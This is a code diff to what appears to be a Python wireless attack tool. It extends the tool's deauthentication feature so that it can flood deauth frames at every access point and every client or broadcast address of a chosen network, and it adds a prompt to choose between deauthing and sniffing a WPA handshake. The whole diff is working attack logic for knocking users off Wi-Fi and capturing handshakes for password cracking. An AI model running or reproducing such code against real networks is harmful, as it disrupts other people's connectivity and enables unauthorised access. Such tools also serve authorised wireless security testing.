@@ -21,6 +21,7 @@ Dot11Type = Dot11FCS
 # Global used variables
 networks = []  # All found networks (essids)
 threads = set()  # All threads that are used should be addedd to this list
+deauth_threads = set()  # Threads used for deauthing
 selected_network = None  # The network to attack
 selected_ap = None  # The access point to attack
 
@@ -42,9 +43,19 @@ def main():
 
     selected_network = select_network()
     selected_ap = select_ap()
-    channel_hopper_thread.stop = True
-    channel_hopper_thread.join()
-    utilities.set_channel(iface, selected_ap.channel)
+
+    if selected_ap is AccessPoint.AllAccessPoints:
+        # Add all existing clients to AllAPs clients list for proper ID picking
+        selected_ap.network = selected_network
+        for ap in selected_network.aps:
+            if ap is not AccessPoint.AllAccessPoints:
+                for client in ap.clients:
+                    if client is not Client.AllClients and client is not Client.Broadcast:
+                        selected_ap.clients.append(Client(client.ap, len(selected_ap.clients), client.mac))
+    else:
+        channel_hopper_thread.stop = True
+        channel_hopper_thread.join()
+        utilities.set_channel(iface, selected_ap.channel)
     selected_client = select_client()
 
     print("")
@@ -53,7 +64,12 @@ def main():
     print("With the following client being the target:")
     print(selected_client)
     print("")
-    sniff_handshake(selected_ap.bssid, selected_client.mac)
+
+    option = input("Do you want to deauth or sniff a handshake? (D/S): ")
+    if option is "D":
+        deauth(selected_ap, selected_client)
+    else:
+        sniff_handshake(selected_ap, selected_client)
 
     print("Done running, exiting")
 
@@ -134,28 +150,56 @@ def select_client():
 
 
 # Sends deauth attacks
-def deauth(target_network, target_client):
+def deauth(target_ap, target_client):
     global iface
 
-    input("Press enter to start sending deauth")
-    deauth_start(target_network, target_client)
-    input("Press enter to stop sending deauth")
+    input("Press enter to start sending deauth(s)")
+    deauth_start(target_ap, target_client)
+    input("Press enter to stop sending deauth(s)")
     deauth_stop()
 
 
 def deauth_start(target_ap, target_client):
-    global threads, deauth_thread
+    global threads, deauth_threads
 
-    deauth_thread = DeauthSender(iface, target_ap, target_client)
-    threads.add(deauth_thread)
-    deauth_thread.start()
+    # Collect all selected APs
+    t_aps = set()
+    if target_ap is AccessPoint.AllAccessPoints:
+        for ap in target_ap.network.aps:
+            if ap is not AccessPoint.AllAccessPoints:
+                t_aps.add(ap)
+    else:
+        t_aps.add(target_ap)
+
+    # Collect the clients for them
+    t_clients = set()
+    if target_client is Client.Broadcast:
+        for ap in t_aps:
+            t_clients.add(Client(ap, 0, "ff:ff:ff:ff:ff:ff"))
+    elif target_client is Client.AllClients:
+        for ap in t_aps:
+            for client in ap.clients:
+                if client is not Client.Broadcast and client is not Client.AllClients:
+                    t_clients.add(client)
+    else:  # Just one Client
+        t_clients.add(target_client)
+
+    # Start all the deauths
+    for client in t_clients:
+        deauth_thread = DeauthSender(iface, client.ap.bssid, client.mac)
+        deauth_threads.add(deauth_thread)
+        threads.add(deauth_thread)
+        deauth_thread.start()
 
 
 def deauth_stop():
-    global threads, deauth_thread
+    global threads, deauth_threads
 
-    deauth_thread.stop = True
-    deauth_thread.join()
+    for deauth_thread in deauth_threads:
+        deauth_thread.stop = True
+
+    for deauth_thread in deauth_threads:
+        deauth_thread.join()
 
 
 # Sniff a handshake
@@ -182,6 +226,7 @@ def catch_exceptions(signal, frame):
 def finalize():
     global iface, threads
 
+    print("")
     print("Cleaning up threads")
 
     # Stop all threads that are still running
@@ -207,5 +252,5 @@ if __name__ == '__main__':
     # Makes sure CTRL+C is captured gracefully but can still be double done
     try:
         main()
-    except Exception as e:
+    except KeyboardInterrupt as e:
         finalize()
